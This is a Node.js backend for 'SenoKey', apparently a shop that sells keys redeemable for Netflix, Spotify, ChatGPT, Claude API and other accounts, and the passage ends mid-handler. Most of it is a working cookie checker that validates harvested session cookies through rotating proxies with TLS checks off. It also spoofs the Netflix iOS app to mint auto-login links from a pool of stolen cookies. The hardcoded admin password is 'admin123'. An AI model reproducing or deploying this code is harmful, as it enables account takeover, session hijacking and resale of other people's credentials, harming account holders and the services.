'use strict';
const http   = require('http');
const https  = require('https');
const net    = require('net');
const tls    = require('tls');
const zlib   = require('zlib');
const fs     = require('fs');
const path   = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 4000;
const D    = __dirname;
const DATA = process.env.DATA_DIR || path.join(D, 'data');
fs.mkdirSync(DATA, { recursive: true });

const PATHS = {
  config:   path.join(DATA, 'config.json'),
  keys:     path.join(DATA, 'keys.json'),
  products: path.join(DATA, 'products.json'),
  log:      path.join(DATA, 'log.json'),
};

// ── JSON helpers ──────────────────────────────────────────────────────────────
function loadJSON(p, def) {
  try { return JSON.parse(fs.readFileSync(p, 'utf8')); }
  catch { fs.writeFileSync(p, JSON.stringify(def, null, 2)); return def; }
}
function saveJSON(p, data) { fs.writeFileSync(p, JSON.stringify(data, null, 2)); }

const DEFAULT_CONFIG = {
  adminPassword: 'admin123',
  siteName: 'SenoKey',
  siteTagline: 'Your Key. Instant Access.',
};

const DEFAULT_PRODUCTS = {
  netflix:    { id:'netflix',    name:'Netflix Premium',    cat:'streaming', icon:'🎬', color:'#e50914', bg:'rgba(229,9,20,.15)',    desc:'Private 4K Netflix — 4 screens, UHD quality, private account', tags:['4K','4 Screens','Private'],  credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'plan',l:'Plan',ph:'Premium 4K'},{k:'expires',l:'Expires',ph:'Dec 2026'},{k:'pin',l:'Profile PIN',ph:'(optional)'}], note:'Change the password immediately after signing in.', enabled:true, order:1 },
  disney:     { id:'disney',     name:'Disney+',            cat:'streaming', icon:'🏰', color:'#113ccf', bg:'rgba(17,60,207,.15)',   desc:'Marvel, Star Wars, Pixar, National Geographic, Disney classics', tags:['4K','Family','Bundle'],     credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'plan',l:'Plan',ph:'Disney+ Standard'},{k:'expires',l:'Expires'}], note:'Change the password immediately after signing in.', enabled:true, order:2 },
  max:        { id:'max',        name:'Max (HBO)',           cat:'streaming', icon:'🎭', color:'#5a189a', bg:'rgba(90,24,154,.15)',   desc:'HBO originals, Warner Bros films, live sports and news',         tags:['4K','HBO','WB Films'],      credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'plan',l:'Plan',ph:'Ultimate 4K'},{k:'expires',l:'Expires'}], note:'Change the password immediately after signing in.', enabled:true, order:3 },
  prime:      { id:'prime',      name:'Amazon Prime Video', cat:'streaming', icon:'📦', color:'#00a8e0', bg:'rgba(0,168,224,.12)',   desc:'Lifetime Prime Video access via unlock — unlimited films & series', tags:['Lifetime','HD','Originals'], credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'plan',l:'Plan',ph:'Prime Video'},{k:'expires',l:'Expires'}], note:'Change the email and password immediately.', enabled:true, order:4 },
  crunchyroll:{ id:'crunchyroll',name:'Crunchyroll Premium',cat:'streaming', icon:'🌸', color:'#f47521', bg:'rgba(244,117,33,.12)',  desc:'All anime, simulcasts, dubs, no ads — full premium experience',   tags:['HD','No Ads','Simulcasts'], credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'expires',l:'Expires'}], note:'Change the password immediately after signing in.', enabled:true, order:5 },
  youtube:    { id:'youtube',    name:'YouTube Premium',    cat:'streaming', icon:'▶',  color:'#ff0000', bg:'rgba(255,0,0,.1)',      desc:'Ad-free YouTube plus YouTube Music included in every plan',      tags:['No Ads','YT Music','4K'],  credFields:[{k:'email',l:'Gmail'},{k:'password',l:'Password'},{k:'expires',l:'Expires'}], note:'Sign in to YouTube using this Gmail account. Change the password.', enabled:true, order:6 },
  appletv:    { id:'appletv',    name:'Apple TV+',          cat:'streaming', icon:'🍎', color:'#888888', bg:'rgba(136,136,136,.1)',  desc:'Apple originals — Severance, Ted Lasso, The Morning Show & more', tags:['4K','Dolby','Originals'],  credFields:[{k:'email',l:'Apple ID'},{k:'password',l:'Password'},{k:'expires',l:'Expires'}], note:'Change the Apple ID password immediately.', enabled:true, order:7 },
  hulu:       { id:'hulu',       name:'Hulu',               cat:'streaming', icon:'💚', color:'#1ce783', bg:'rgba(28,231,131,.1)',   desc:'Hulu No-Ads plan — movies, shows, next-day TV and Originals',    tags:['No Ads','Live TV','4K'],   credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'plan',l:'Plan',ph:'No Ads'},{k:'expires',l:'Expires'}], note:'Change the password immediately after signing in.', enabled:true, order:8 },
  spotify1m:  { id:'spotify1m',  name:'Spotify 1 Month',    cat:'music',     icon:'🎵', color:'#1db954', bg:'rgba(29,185,84,.1)',    desc:'Premium music for 1 month. Email + password delivered instantly.', tags:['1 Month','No Ads','Offline'], credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'}], note:'Change the email and password immediately to secure your account.', enabled:true, order:9 },
  spotify3m:  { id:'spotify3m',  name:'Spotify 3 Months',   cat:'music',     icon:'🎵', color:'#1db954', bg:'rgba(29,185,84,.12)',   desc:'Premium music for 3 months. Change password after redeem.',       tags:['3 Months','No Ads','Offline'], credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'}], note:'Change the email and password immediately to secure your account.', enabled:true, order:10 },
  deezer:     { id:'deezer',     name:'Deezer Premium',     cat:'music',     icon:'🎶', color:'#a238ff', bg:'rgba(162,56,255,.12)',  desc:'HiFi lossless audio, 90M+ tracks, offline listening',            tags:['HiFi','Lossless','Offline'], credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'expires',l:'Expires'}], note:'Change the password after signing in.', enabled:true, order:11 },
  chatgpt:    { id:'chatgpt',    name:'ChatGPT Plus',       cat:'ai',        icon:'🤖', color:'#10a37f', bg:'rgba(16,163,127,.12)',  desc:'GPT-4o, DALL-E 3, Advanced Voice, all features fully unlocked',  tags:['GPT-4o','DALL-E','Voice'],  credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'expires',l:'Expires'}], note:'Change the password immediately.', enabled:true, order:12 },
  claude:     { id:'claude',     name:'Claude Code',        cat:'ai',        icon:'🧠', color:'#d97706', bg:'rgba(217,119,6,.12)',   desc:'Haiku, Sonnet or Opus — cheap full Claude API access',           tags:['Haiku','Sonnet','Opus'],    credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'apiKey',l:'API Key',ph:'sk-ant-...'},{k:'plan',l:'Plan',ph:'Pro'}], note:'Do not share your API key.', enabled:true, order:13 },
  capcut:     { id:'capcut',     name:'CapCut Pro',         cat:'tools',     icon:'🎞', color:'#ffffff', bg:'rgba(255,255,255,.06)', desc:'Pro effects, no watermark, premium templates and filters',        tags:['No Watermark','Pro FX','Templates'], credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'expires',l:'Expires'}], note:'Change the password immediately.', enabled:true, order:14 },
  nordvpn:    { id:'nordvpn',    name:'NordVPN Premium',    cat:'tools',     icon:'🛡', color:'#4687ff', bg:'rgba(70,135,255,.12)',  desc:'1 month VPN — fastest servers in 60+ countries, kill switch',    tags:['1 Month','60+ Countries','Fast'], credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'expires',l:'Expires'}], note:'Download NordVPN and sign in with these credentials.', enabled:true, order:15 },
  notion:     { id:'notion',     name:'Notion AI',          cat:'tools',     icon:'📝', color:'#ffffff', bg:'rgba(255,255,255,.06)', desc:'Notion Plus with AI — unlimited pages, AI assistant, team workspaces', tags:['AI','Unlimited','Teams'], credFields:[{k:'email',l:'Email'},{k:'password',l:'Password'},{k:'expires',l:'Expires'}], note:'Change the password immediately after signing in.', enabled:true, order:16 },
};

// ── Cookie checker engine ──────────────────────────────────────────────────────
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

function httpsGET(host, urlPath, headers, timeout = 9000) {
  return new Promise((resolve, reject) => {
    const req = https.get({ hostname: host, path: urlPath, headers, timeout }, res => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });
}

function httpsRequest(method, host, urlPath, headers, bodyStr, timeout = 12000) {
  return new Promise((resolve, reject) => {
    const opts = { hostname: host, path: urlPath, method, headers, timeout };
    const req = https.request(opts, res => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

// ── Proxy support (HTTP CONNECT tunnel, no npm — same as SChecker) ───────────
const PROXIES_FILE = path.join(DATA, 'proxies.txt');
let PROXIES = []; let proxyIdx = 0;
function reloadProxies() {
  try {
    if (!fs.existsSync(PROXIES_FILE)) { PROXIES = []; return; }
    PROXIES = fs.readFileSync(PROXIES_FILE, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
  } catch { PROXIES = []; }
}
reloadProxies();
function getProxy() { if (!PROXIES.length) return null; return PROXIES[proxyIdx++ % PROXIES.length]; }
function parseProxy(s) {
  if (!s) return null;
  if (s.includes('@')) {
    const [auth, rest] = s.split('@'); const pts = rest.split(':'); const [user, pass] = auth.split(':');
    return { host: pts[0], port: parseInt(pts[1]) || 8080, user, pass };
  }
  const pts = s.split(':');
  if (pts.length === 4) return { host: pts[0], port: parseInt(pts[1]) || 8080, user: pts[2], pass: pts[3] };
  return { host: pts[0], port: parseInt(pts[1]) || 8080, user: null, pass: null };
}
const MAX_BODY = 2 * 1024 * 1024;
function httpsViaProxy(proxyStr, method, hostname, pathQ, extraHeaders, body) {
  const px = parseProxy(proxyStr);
  if (!px) return httpsRequest(method, hostname, pathQ, extraHeaders, body || '', 12000);
  return new Promise((resolve, reject) => {
    const sock = net.createConnection(px.port, px.host);
    sock.setTimeout(8000, () => { sock.destroy(); reject(new Error('proxy_timeout')); });
    sock.on('error', reject);
    sock.once('connect', () => {
      let cs = `CONNECT ${hostname}:443 HTTP/1.1\r\nHost: ${hostname}:443\r\n`;
      if (px.user) cs += `Proxy-Authorization: Basic ${Buffer.from(`${px.user}:${px.pass}`).toString('base64')}\r\n`;
      cs += '\r\n'; sock.write(cs);
    });
    let hbuf = '';
    sock.on('data', function onCon(chunk) {
      hbuf += chunk.toString('binary');
      if (!hbuf.includes('\r\n\r\n')) return;
      sock.removeListener('data', onCon);
      if (!/^HTTP\/1\.[01] 200/.test(hbuf)) { sock.destroy(); return reject(new Error('proxy_connect_failed')); }
      const tlsSock = tls.connect({ socket: sock, servername: hostname, rejectUnauthorized: false });
      tlsSock.setTimeout(10000, () => { tlsSock.destroy(); reject(new Error('timeout')); });
      tlsSock.on('error', reject);
      tlsSock.once('secureConnect', () => {
        const agent = new http.Agent({ keepAlive: false });
        agent.createConnection = (_o, cb) => { setImmediate(() => cb(null, tlsSock)); return tlsSock; };
        const opts = { agent, host: hostname, path: pathQ, method: method || 'GET',
          headers: { Host: hostname, 'User-Agent': UA, Accept: 'application/json, text/html, */*', 'Accept-Encoding': 'gzip, deflate, br', ...extraHeaders } };
        if (body) opts.headers['Content-Length'] = Buffer.byteLength(body);
        const req = http.request(opts, res => {
          const chunks = []; let size = 0;
          res.on('data', d => { size += d.length; if (size <= MAX_BODY) chunks.push(d); });
          res.on('end', () => {
            const buf = Buffer.concat(chunks); const enc = (res.headers['content-encoding'] || '').toLowerCase();
            let rb = buf.toString();
            try { if (enc === 'gzip') rb = zlib.gunzipSync(buf).toString(); else if (enc === 'deflate') rb = zlib.inflateSync(buf).toString(); else if (enc === 'br') rb = zlib.brotliDecompressSync(buf).toString(); } catch {}
            resolve({ status: res.statusCode, body: rb, headers: res.headers });
          });
        });
        req.setTimeout(10000, () => { req.destroy(); reject(new Error('timeout')); });
        req.on('error', reject);
        if (body) req.write(body);
        req.end();
      });
    });
  });
}
// Proxy-aware GET/POST for Netflix checks
const nfGET  = (h, p, hd)    => PROXIES.length ? httpsViaProxy(getProxy(), 'GET',  h, p, hd || {}) : httpsGET(h, p, hd);
const nfPOST = (h, p, hd, b) => PROXIES.length ? httpsViaProxy(getProxy(), 'POST', h, p, hd || {}, b || '') : httpsRequest('POST', h, p, hd || {}, b || '', 12000);

// ── Cookie parsing (same logic as SChecker extension) ─────────────────────────
function parseCookies(text) {
  if (!text) return [];
  // JSON array format
  try {
    const a = JSON.parse(text.trim());
    if (Array.isArray(a)) return a.map(c => ({ name: String(c.name||''), value: String(c.value||''), domain: String(c.domain||'').replace(/^\./,''), expirationDate: c.expirationDate||c.expires||null }));
  } catch {}
  // Netscape tab-separated format
  const nc = [];
  for (const line of text.split(/\r?\n/)) {
    const t = line.trim();
    if (!t || t.startsWith('#')) continue;
    const p = t.split('\t');
    if (p.length >= 7) nc.push({ domain: p[0].replace(/^\./,''), name: p[5].trim(), value: p[6].trim(), expirationDate: p[4] ? (parseFloat(p[4]) || null) : null });
  }
  if (nc.length) return nc;
  // Name=Value pairs (semicolon or newline separated)
  return text.split(/[;\n]/).map(s => { const i = s.indexOf('='); return i > 0 ? { name: s.slice(0,i).trim(), value: s.slice(i+1).trim(), domain: '', expirationDate: null } : null; }).filter(Boolean);
}

const gc  = (ck, n)    => ck.find(c => c.name === n)?.value || null;
const cs  = (ck, ...ns) => ck.filter(c => ns.includes(c.name)).map(c => `${c.name}=${c.value}`).join('; ');
const hasN = (ck, ...ns) => ns.some(n => ck.some(c => c.name === n));

// Build a proper Cookie: header from a raw string (Netscape or Name=Value or full header)
function toCookieHeader(raw) {
  const parsed = parseCookies(raw);
  if (parsed.length) return parsed.map(c => `${c.name}=${c.value}`).join('; ');
  return raw; // already a header string
}

const CHECKERS = {
  // Netflix — uses iOS Argo API (not IP-blocked unlike www.netflix.com)
  async netflix(rawCookie) {
    const ck = parseCookies(rawCookie);
    const nfId = gc(ck, 'NetflixId');
    if (!nfId) return { alive: null };
    try {
      const r = await tryNetflixTokenIOS(nfId);
      if (!r) return { alive: null };
      if (r.dead) return { alive: false };
      return { alive: true }; // got a token → alive
    } catch { return { alive: null }; }
  },

  // Spotify — sp_dc cookie → access token endpoint
  async spotify(cookie) {
    if (!cookie.includes('sp_dc')) return { alive: false };
    try {
      const r = await httpsGET('open.spotify.com',
        '/get_access_token?reason=transport&productType=web_player', {
        Cookie: cookie, Accept: 'application/json', 'User-Agent': UA,
      });
      if (r.status !== 200) return { alive: false };
      try {
        const d = JSON.parse(r.body);
        return { alive: d.isAnonymous === false };
      } catch { return { alive: r.status === 200 ? null : false }; }
    } catch { return { alive: null }; }
  },

  // ChatGPT — session cookie check
  async chatgpt(cookie) {
    try {
      const r = await httpsGET('chatgpt.com', '/api/auth/session', {
        Cookie: cookie, Accept: 'application/json', 'User-Agent': UA,
      });
      if (r.status !== 200) return { alive: false };
      try {
        const d = JSON.parse(r.body);
        return { alive: !!(d.accessToken || d.user?.email) };
      } catch { return { alive: null }; }
    } catch { return { alive: null }; }
  },

  // Disney+ — profile check
  async disney(cookie) {
    try {
      const r = await httpsGET('www.disneyplus.com', '/home', {
        Cookie: cookie, Accept: 'text/html', 'User-Agent': UA,
      });
      if (r.status === 302 || r.status === 301) {
        const loc = r.headers?.location || '';
        if (loc.includes('/login') || loc.includes('/signin')) return { alive: false };
      }
      return { alive: r.status === 200 ? true : null };
    } catch { return { alive: null }; }
  },

  // Crunchyroll — cms token check
  async crunchyroll(cookie) {
    try {
      const r = await httpsGET('www.crunchyroll.com', '/content/v2/cms/index', {
        Cookie: cookie, Accept: 'application/json', 'User-Agent': UA,
      });
      if (r.status === 401) return { alive: false };
      return { alive: r.status === 200 ? true : null };
    } catch { return { alive: null }; }
  },

  // YouTube Premium — Google account check
  async youtube(cookie) {
    try {
      const r = await httpsGET('www.youtube.com', '/youtubei/v1/account/account_menu', {
        Cookie: cookie, Accept: 'application/json',
        'X-Goog-Visitor-Id': '', 'User-Agent': UA,
        'Content-Type': 'application/json',
      });
      if (r.status === 401 || r.status === 403) return { alive: false };
      return { alive: r.status === 200 ? true : null };
    } catch { return { alive: null }; }
  },

  // NordVPN — user profile check
  async nordvpn(cookie) {
    try {
      const r = await httpsGET('api.nordvpn.com', '/v1/users/current', {
        Cookie: cookie, Accept: 'application/json', 'User-Agent': UA,
      });
      if (r.status === 401 || r.status === 403) return { alive: false };
      return { alive: r.status === 200 ? true : null };
    } catch { return { alive: null }; }
  },
};

// Map service IDs to checker functions (handles aliases like spotify1m → spotify)
const SERVICE_TO_CHECKER = {
  netflix: 'netflix', disney: 'disney',
  spotify1m: 'spotify', spotify3m: 'spotify',
  chatgpt: 'chatgpt', crunchyroll: 'crunchyroll',
  youtube: 'youtube', nordvpn: 'nordvpn',
};

async function checkCookie(service, cookie) {
  if (!cookie || !cookie.trim()) return { alive: null, reason: 'no_cookie' };
  const checkerKey = SERVICE_TO_CHECKER[service];
  if (!checkerKey || !CHECKERS[checkerKey]) return { alive: null, reason: 'no_checker' };
  try {
    const result = await CHECKERS[checkerKey](cookie.trim());
    return result;
  } catch(e) {
    return { alive: null, reason: 'error' };
  }
}

// ── Netflix login-link generator (iOS Argo API) ───────────────────────────────
function nftokenToLinks(token) {
  const enc = encodeURIComponent(token);
  return {
    web:    `https://netflix.com/?nftoken=${enc}`,
    mobile: `https://netflix.com/unsupported?nftoken=${enc}`,
    tv:     `https://netflix.com/tv2?nftoken=${enc}`,
  };
}

const NF_IOS_HOST = 'ios.prod.ftl.netflix.com';
const NF_IOS_PARAMS = new URLSearchParams({
  appVersion: '15.48.1',
  config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true"}',
  device_type: 'NFAPPL-02-',
  idiom: 'phone',
  iosVersion: '15.8.5',
  isTablet: 'false',
  languages: 'en-US',
  locale: 'en-US',
  maxDeviceWidth: '375',
  model: 'saget',
  modelType: 'IPHONE8-1',
  odpAware: 'true',
  path: '["account","token","default"]',
  pathFormat: 'graph',
  pixelDensity: '2.0',
  progressive: 'false',
  responseFormat: 'json',
  esn: 'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
}).toString();
const NF_IOS_PATH = `/iosui/user/15.48?${NF_IOS_PARAMS}`;

const NF_IOS_HDRS = (netflixId) => ({
  Cookie: `NetflixId=${netflixId}`,
  'User-Agent': 'Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
  'x-netflix.request.attempt': '1',
  'x-netflix.request.client.user.guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
  'x-netflix.context.profile-guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
  'x-netflix.context.app-version': '15.48.1',
  'x-netflix.argo.translated': 'true',
  'x-netflix.context.form-factor': 'phone',
  'x-netflix.context.sdk-version': '2012.4',
  'x-netflix.client.appversion': '15.48.1',
  'x-netflix.context.max-device-width': '375',
  'x-netflix.context.ab-tests': '',
  'x-netflix.tracing.cl.useractionid': '4DC655F2-9C3C-4343-8229-CA1B003C3053',
  'x-netflix.client.type': 'argo',
  'x-netflix.context.locales': 'en-US',
  'x-netflix.client.iosversion': '15.8.5',
  'accept-language': 'en-US;q=1',
  'x-netflix.argo.abtests': '',
  'x-netflix.context.os-version': '15.8.5',
  'x-netflix.context.ui-flavor': 'argo',
  'x-netflix.argo.nfnsm': '9',
  'x-netflix.client.ftl.esn': 'NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
  'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
  'x-netflix.request.client.context': '{"appState":"foreground"}',
  'x-netflix.request.toplevel.uuid': '90AFE39F-ADF1-4D8A-B33E-528730990FE3',
  Accept: 'application/json',
});

// Extract unique NetflixId values from all Netflix keys in pool
function getPoolNetflixIds(keys) {
  const seen = new Set();
  const ids = [];
  for (const entry of Object.values(keys)) {
    if (entry.service !== 'netflix' || !entry.cookie) continue;
    const ck = parseCookies(entry.cookie);
    const nfId = gc(ck, 'NetflixId');
    if (nfId && !seen.has(nfId)) { seen.add(nfId); ids.push(nfId); }
  }
  return ids;
}

// Single attempt via iOS Argo API — only needs NetflixId
// Returns login links on success, null on unknown, { dead: true } on 401/403
async function tryNetflixTokenIOS(netflixId) {
  try {
    const fn = PROXIES.length
      ? httpsViaProxy(getProxy(), 'GET', NF_IOS_HOST, NF_IOS_PATH, NF_IOS_HDRS(netflixId))
      : httpsRequest('GET', NF_IOS_HOST, NF_IOS_PATH, NF_IOS_HDRS(netflixId), '', 15000);
    const r = await fn;
    if (r.status === 401 || r.status === 403) { console.log(`[NF iOS] dead → ${r.status}`); return { dead: true }; }
    if (r.status !== 200) { console.log(`[NF iOS] → ${r.status}`); return null; }
    const d = JSON.parse(r.body);
    const token = ((d?.value?.account?.token?.default) || {}).token;
    if (token) { console.log('[NF iOS] token OK'); return nftokenToLinks(token); }
    console.log(`[NF iOS] 200 but no token — body: ${r.body.slice(0, 120)}`);
  } catch(e) { console.log(`[NF iOS] error: ${e.message}`); }
  return null;
}

// Try all unique NetflixIds in parallel batches of 10
async function generateNetflixLinksFromPool(keys) {
  const ids = getPoolNetflixIds(keys);
  console.log(`[NF pool] ${ids.length} unique NetflixId(s) found`);
  if (!ids.length) return { error: 'no_cookies_in_pool', detail: 'no valid NetflixId found in database' };

  const BATCH = 10;
  for (let i = 0; i < ids.length; i += BATCH) {
    const batch = ids.slice(i, i + BATCH);
    const results = await Promise.all(batch.map(id => tryNetflixTokenIOS(id)));
    const winner = results.find(r => r != null && !r.dead);
    if (winner) return winner;
  }
  return { error: 'token_generation_failed', detail: `tried ${ids.length} NetflixId(s)` };
}

// ── File import parser ─────────────────────────────────────────────────────────
function parseImportContent(content, format = 'auto') {
  const entries = [];
  const trimmed = content.trim();
  // JSON
  if (format === 'auto' || format === 'json') {
    if (trimmed.startsWith('[') || trimmed.startsWith('{')) {
      try {
        let arr = JSON.parse(trimmed);
        if (!Array.isArray(arr)) arr = [arr];
        for (const item of arr) {
          const e = { credentials: {} };
          if (item.key) e.key = item.key;
          if (item.cookie) e.cookie = item.cookie;
          for (const f of ['email','password','plan','expires','pin','apiKey','server','username','user','pass']) {
            if (item[f]) { const m = f==='user'?'email':f==='pass'?'password':f; e.credentials[m]=item[f]; }
          }
          if (item.credentials) Object.assign(e.credentials, item.credentials);
          entries.push(e);
        }
        if (entries.length > 0) return entries;
      } catch {}
    }
  }
  // Line-by-line
  const lines = trimmed.split('\n').map(l=>l.trim()).filter(l=>l && !l.startsWith('#') && !l.startsWith('//'));
  for (const line of lines) {
    if (format === 'cookie' || (format === 'auto' && line.length > 80 && /\w+=.+;\s*\w+=/.test(line))) {
      entries.push({ cookie: line, credentials: {} }); continue;
    }
    const sep = line.includes(',') ? ',' : ':';
    const parts = line.split(sep).map(s=>s.trim());
    let offset = 0;
    const e = { credentials: {} };
    if (parts[0]?.toUpperCase().startsWith('SENO-')) { e.key = parts[0].toUpperCase(); offset = 1; }
    const [email='',password='',plan='',expires=''] = parts.slice(offset);
    if (email) e.credentials.email = email;
    if (password) e.credentials.password = password;
    if (plan) e.credentials.plan = plan;
    if (expires) e.credentials.expires = expires;
    entries.push(e);
  }
  return entries;
}

// ── Runtime state ─────────────────────────────────────────────────────────────
const sessions = new Map(); // token → { at }

function makeSession() {
  const t = crypto.randomBytes(32).toString('hex');
  sessions.set(t, { at: Date.now() });
  return t;
}
function checkSession(req) {
  const m = (req.headers.cookie || '').match(/seno_admin=([a-f0-9]{64})/);
  if (!m) return false;
  const s = sessions.get(m[1]);
  if (!s) return false;
  if (Date.now() - s.at > 24 * 3600 * 1000) { sessions.delete(m[1]); return false; }
  s.at = Date.now(); // rolling session
  return true;
}

function readBody(req, max = 4 * 1024 * 1024) {
  return new Promise((res, rej) => {
    const c = []; let n = 0;
    req.on('data', d => { n += d.length; if (n > max) { req.destroy(); rej(new Error('body_too_large')); } else c.push(d); });
    req.on('end', () => res(Buffer.concat(c).toString('utf8')));
    req.on('error', rej);
  });
}

function J(s) { try { return JSON.parse(s); } catch { return null; } }
const JCT  = { 'Content-Type': 'application/json' };
const HCT  = { 'Content-Type': 'text/html; charset=utf-8' };
const json = (res, code, data) => { res.writeHead(code, JCT); res.end(JSON.stringify(data)); };
const html = (res, file) => { res.writeHead(200, HCT); res.end(fs.readFileSync(path.join(D, file))); };

function appendLog(entry) {
  let log = [];
  try { log = JSON.parse(fs.readFileSync(PATHS.log, 'utf8')); } catch {}
  log.unshift({ ...entry, at: Date.now() });
  if (log.length > 2000) log.length = 2000;
  fs.writeFileSync(PATHS.log, JSON.stringify(log));
}

function genKey() {
  const r = () => crypto.randomBytes(2).toString('hex').toUpperCase();
  return `SENO-${r()}-${r()}-${r()}`;
}

const KEY_RE = /^SENO-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/;

// ── HTTP server ───────────────────────────────────────────────────────────────
http.createServer(async (req, res) => {
  const url  = req.url.split('?')[0];
  const meth = req.method;

  // CORS preflight
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (meth === 'OPTIONS') { res.writeHead(204); return res.end(); }

  try {

    // ── Static pages ───────────────────────────────────────────────────────
    if (meth === 'GET' && url === '/')       return html(res, 'index.html');
    if (meth === 'GET' && url === '/admin')  return html(res, 'admin.html');
    if (meth === 'GET' && url === '/favicon.ico') { res.writeHead(404); return res.end(); }

    // ── Public API ─────────────────────────────────────────────────────────

    // Products with live stock counts
    if (meth === 'GET' && url === '/api/products') {
      const products = loadJSON(PATHS.products, DEFAULT_PRODUCTS);
      const keys     = loadJSON(PATHS.keys, {});
      const stock = {};
      Object.values(keys).forEach(k => {
        if (!k.claimed && !k.disabled) stock[k.service] = (stock[k.service] || 0) + 1;
      });
      const list = Object.values(products)
        .filter(p => p.enabled !== false)
        .sort((a, b) => (a.order || 99) - (b.order || 99))
        .map(p => ({ ...p, stock: stock[p.id] || 0 }));
      return json(res, 200, list);
    }

    // Redeem a key
    if (meth === 'POST' && url === '/api/redeem') {
      const body = J(await readBody(req));
      if (!body?.key) return json(res, 400, { error: 'missing_key' });
      const k = body.key.trim().toUpperCase();
      if (!KEY_RE.test(k)) return json(res, 400, { error: 'invalid_format', message: 'Key should be SENO-XXXX-XXXX-XXXX' });

      const keys     = loadJSON(PATHS.keys, {});
      const products = loadJSON(PATHS.products, DEFAULT_PRODUCTS);
      const entry    = keys[k];

      if (!entry)          return json(res, 404, { error: 'not_found',  message: 'Key not found. Check your key and try again.' });
      if (entry.disabled)  return json(res, 403, { error: 'disabled',   message: 'This key has been disabled.' });

      const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

      // ── Live cookie health-check (before delivering) ──────────────────────
      if (entry.cookie) {
        const check = await checkCookie(entry.service, entry.cookie);
        entry.lastChecked  = Date.now();
        entry.lastCheckOk  = check.alive;
        if (check.alive === false) {
          // Account is confirmed dead — mark and refuse delivery
          entry.dead    = true;
          entry.deadAt  = Date.now();
          keys[k] = entry;
          saveJSON(PATHS.keys, keys);
          appendLog({ type: 'dead', key: k, service: entry.service, ip });
          return json(res, 410, {
            error: 'account_expired',
            message: 'This account is no longer active. Please contact support with your key for a replacement.',
          });
        }
        // alive === true or null (can't determine): proceed — save check timestamp
        keys[k] = entry;
        saveJSON(PATHS.keys, keys);
      }
      // ─────────────────────────────────────────────────────────────────────

      const isNew = !entry.claimed;

      if (isNew) {
        entry.claimed    = true;
        entry.claimedAt  = Date.now();
        entry.claimedIP  = ip;
        keys[k]          = entry;
        saveJSON(PATHS.keys, keys);
        appendLog({ type: 'redeem', key: k, service: entry.service, ip, new: true });
      } else {
        appendLog({ type: 'retrieve', key: k, service: entry.service, ip, new: false });
      }

      const p = products[entry.service] || {};

      // Auto-generate login links for Netflix — scan entire pool for a working cookie
      let loginLinks = null;
      if (entry.service === 'netflix') {
        try { loginLinks = await generateNetflixLinksFromPool(keys); } catch {}
      }

      // IMPORTANT: cookie is intentionally stripped — never sent to client
      const { cookie: _c, ...safeEntry } = entry;
      return json(res, 200, {
        ok: true, isNew,
        key: k,
        service:      entry.service,
        serviceName:  p.name  || entry.service,
        serviceIcon:  p.icon  || '🔑',
        serviceNote:  p.note  || null,
        claimedAt:    entry.claimedAt,
        credentials:  entry.credentials || {},
        checkedAlive: entry.lastCheckOk ?? null,
        loginLinks,
        hasLoginLinks: entry.service === 'netflix',
      });
    }

    // Stats public (for hero counter)
    if (meth === 'GET' && url === '/api/stats') {
      const keys = loadJSON(PATHS.keys, {});
      const all  = Object.values(keys);
      return json(res, 200, { total: all.length, claimed: all.filter(k => k.claimed).length });
    }

    // ── Admin login ─────────────────────────────────────────────────────────
    if (meth === 'POST' && url === '/api/admin/login') {
      const body = J(await readBody(req));
      const cfg  = loadJSON(PATHS.config, DEFAULT_CONFIG);
      if (!body || body.password !== cfg.adminPassword)
        return json(res, 401, { error: 'wrong_password' });
      const token = makeSession();
      res.setHeader('Set-Cookie', `seno_admin=${token}; HttpOnly; Path=/; Max-Age=86400; SameSite=Strict`);
      return json(res, 200, { ok: true });
    }

    if (meth === 'POST' && url === '/api/admin/logout') {
      const m = (req.headers.cookie || '').match(/seno_admin=([a-f0-9]{64})/);
      if (m) sessions.delete(m[1]);
      res.setHeader('Set-Cookie', 'seno_admin=; Path=/; Max-Age=0');
